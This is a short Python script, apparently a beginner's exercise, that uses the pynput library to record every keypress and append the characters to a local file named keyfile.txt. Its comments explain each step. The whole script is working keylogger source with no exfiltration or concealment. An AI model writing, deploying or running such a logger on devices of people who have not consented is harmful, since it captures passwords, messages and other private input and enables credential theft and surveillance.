from pynput import keyboard
#pynput needs to be isntalled 

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey: #this makes the keyfile.txt and the 'a' will make this keeps adding to it so it is not going to reset itself or delete the keys written before
        try:
            char = key.char
            logKey.write(char)
        except:
            print('Error getting char')

if __name__=='__main__':
    listener = keyboard.Listener(on_press=keyPressed) #Every time the key is pressed it tells the information to function
    listener.start()
    input()